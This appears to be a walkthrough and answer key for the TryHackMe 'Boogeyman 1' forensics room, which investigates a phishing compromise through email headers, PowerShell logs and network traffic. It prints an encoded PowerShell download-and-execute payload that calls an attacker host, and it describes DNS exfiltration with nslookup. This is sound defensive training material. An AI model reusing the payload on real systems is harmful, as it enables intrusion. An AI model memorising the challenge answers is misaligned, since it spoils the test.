# **TryHackMe**

## **Boogeyman 1**

### Difficulty: Medium - 120 mins

Prerequisites

This room may require the combined knowledge gained from the SOC L1 Pathway. We recommend going through the following rooms before attempting this challenge.

    Phishing Analysis Fundamentals
    Phishing Analysis Tools
    Windows Event Logs
    Wireshark: Traffic Analysis
    Tshark: The Basics

Investigation Platform

Before we proceed, deploy the attached machine by clicking the Start Machine button in the upper-right-hand corner of the task. It may take up to 3-5 minutes to initialise the services.

The machine will start in a split-screen view. In case the VM is not visible, use the blue Show Split View button at the top-right of the page.

Artefacts

For the investigation proper, you will be provided with the following artefacts:

    Copy of the phishing email (dump.eml)
    Powershell Logs from Julianne's workstation (powershell.json)
    Packet capture from the same workstation (capture.pcapng)

Note: The powershell.json file contains JSON-formatted PowerShell logs extracted from its original evtx file via the evtx2json tool.

You may find these files in the /home/ubuntu/Desktop/artefacts directory.

Tools

The provided VM contains the following tools at your disposal:

    Thunderbird - a free and open-source cross-platform email client.
    LNKParse3 - a python package for forensics of a binary file with LNK extension.
    Wireshark - GUI-based packet analyser.
    Tshark - CLI-based Wireshark. 
    jq - a lightweight and flexible command-line JSON processor.

To effectively parse and analyse the provided artefacts, you may also utilise built-in command-line tools such as:

    grep
    sed
    awk
    base64

Now, let's start hunting the Boogeyman!

## Task 2: [Email Analysis] Look at that headers! ##

The Boogeyman is here!

Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.

Email Sample.

The security team was able to flag the suspicious execution of the attachment, in addition to the phishing reports received from the other finance department employees, making it seem to be a targeted attack on the finance team. Upon checking the latest trends, the initial TTP used for the malicious attachment is attributed to the new threat group named Boogeyman, known for targeting the logistics sector.

You are tasked to analyse and assess the impact of the compromise.

Investigation Guide

Given the initial information, we know that the compromise started with a phishing email. Let's start with analysing the dump.eml file located in the artefacts directory. There are two ways to analyse the headers and rebuild the attachment:

    The manual way uses command-line tools such as cat, grep, base64, and sed. Analyse the contents manually and build the attachment by decoding the string located at the bottom of the file.

`ubuntu@tryhackme:~`

`ubuntu@tryhackme$ echo # sample command to rebuild the payload, presuming the encoded payload is written in another file, without all line terminators`
`ubuntu@tryhackme$ cat *PAYLOAD FILE* | base64 -d > Invoice.zip `

    An alternative and easier way to do this is to double-click the EML file to open it via Thunderbird. The attachment can be saved and extracted accordingly.

Once the payload from the encrypted archive is extracted, use lnkparse to extract the information inside the payload.
`ubuntu@tryhackme:~`

`ubuntu@tryhackme$ lnkparse *LNK FILE* `

Answer the questions below
1. What is the email address used to send the phishing email?
- *agriffin@bpakcaging.xyz*

2. What is the email address of the victim?
- *julianne.westcott@hotmail.com*

3. What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?
- We can copy the content of the email header and use online tool to analyze the content. Here I used https://mha.azurewebsites.net/
- *elasticemail*

4. What is the name of the file inside the encrypted attachment?
- *Invoice_20230103.lnk*

5. What is the password of the encrypted attachment?
- *Invoice2023!*

6. Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?
- Parse the the malicious file using the tool mentioned.
- `Inkparse Invoice_20230103.lnk`
- Decode the strings in cyberchef.
- *aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==*

## Task 3: [Endpoint Security] Are you sure that’s an invoice? ##

Based on the initial findings, we discovered how the malicious attachment compromised Julianne's workstation:

    A PowerShell command was executed.
    Decoding the payload reveals the starting point of endpoint activities. 

Investigation Guide

With the following discoveries, we should now proceed with analysing the PowerShell logs to uncover the potential impact of the attack:

    Using the previous findings, we can start our analysis by searching the execution of the initial payload in the PowerShell logs.
    Since the given data is JSON, we can parse it in CLI using the jq command.
    Note that some logs are redundant and do not contain any critical information; hence can be ignored.

JQ Cheatsheet

jq is a lightweight and flexible command-line JSON processor. This tool can be used in conjunction with other text-processing commands. 

You may use the following table as a guide in parsing the logs in this task.

Note: You must be familiar with the existing fields in a single log.
- Parse all JSON into beautified output	
`cat powershell.json | jq` 

- Print all values from a specific field without printing the field	
`cat powershell.json | jq '.Field1'`

- Print all values from a specific field
`cat powershell.json | jq '{Field1}'`

- Print values from multiple fields	
`cat powershell.json | jq '{Field1, Field2}'`

- Sort logs based on their Timestamp	
`cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'`

- Sort logs based on their Timestamp and print multiple field values
`cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[] | {Field}'`

You may continue learning this tool via its documentation.
Answer the questions below
1. What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)
- `jq -r 'keys[]' powershell.json |sort | uniq`
- `cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'| jq '{ScriptBlockText}'| sort | uniq`
- *cdn.bpakcaging.xyz,files.bpakcaging.xyz*

2. What is the name of the enumeration tool downloaded by the attacker?
- *Seatbelt*

3. What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.
- `cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'| jq '{ScriptBlockText}'| sort | uniq | grep -e 'sq3.exe' -e 'cd'`
- *C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite*

4. What is the software that uses the file in Q3?
- *Microsoft Sticky Notes*

5. What is the name of the exfiltrated file?
- `cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'| jq '{ScriptBlockText}'| sort | uniq`
- *protected_data.kdbx*

6. What type of file uses the .kdbx file extension?
- *KeePass*

7. What is the encoding used during the exfiltration attempt of the sensitive file?
- *hex*

8. What is the tool used for exfiltration?
- *nslookup*


## Task 4: [Network Traffic Analysis] They got us. Call the bank immediately! ##

Based on the PowerShell logs investigation, we have seen the full impact of the attack:

    -The threat actor was able to read and exfiltrate two potentially sensitive files.
    The domains and ports used for the network activity were discovered, including the tool used by the threat actor for exfiltration.

Investigation Guide

Finally, we can complete the investigation by understanding the network traffic caused by the attack:

    Utilise the domains and ports discovered from the previous task.
    All commands executed by the attacker and all command outputs were logged and stored in the packet capture.
    Follow the streams of the notable commands discovered from PowerShell logs.
    Based on the PowerShell logs, we can retrieve the contents of the exfiltrated data by understanding how it was encoded and extracted.

Answer the questions below
1. What software is used by the attacker to host its presumed file/payload server?
- Filter the packet with http and keyword of the URL where the file was hosted.
- Follow the TCP stream of the filtered results and we could see in the response section the software used to host the file.
- *Python*

2. What HTTP method is used by the C2 for the output of the commands executed by the attacker?
- We discovered the method used in the previous task.
- *POST*

3. What is the protocol used during the exfiltration activity?
- We also discovered from the previous task that DNS lookup was used to exfiltrate a file.
- *dns*

4. What is the password of the exfiltrated file?
- Filter in Wireshark packets with HTTP with a keyword containing the binary used to enumerate the SQLite database.
- Follow the TCP stream. We see the SQL command used to retrieve the data from the table “NOTE”. Note that stream is at packet 749.
- *%p9^3!lL^Mz47E2GaT^y*

5. What is the credit card number stored inside the exfiltrated file?
- Using Wireshark at first, I built a display filter that utilizes the info we got from the previous task: nslookup -q=A. This can be done by going to "Analyze > Display Filter Expressions".
- Added to the filter is the destination IP of the exfiltrated file.
- *4024007128269551*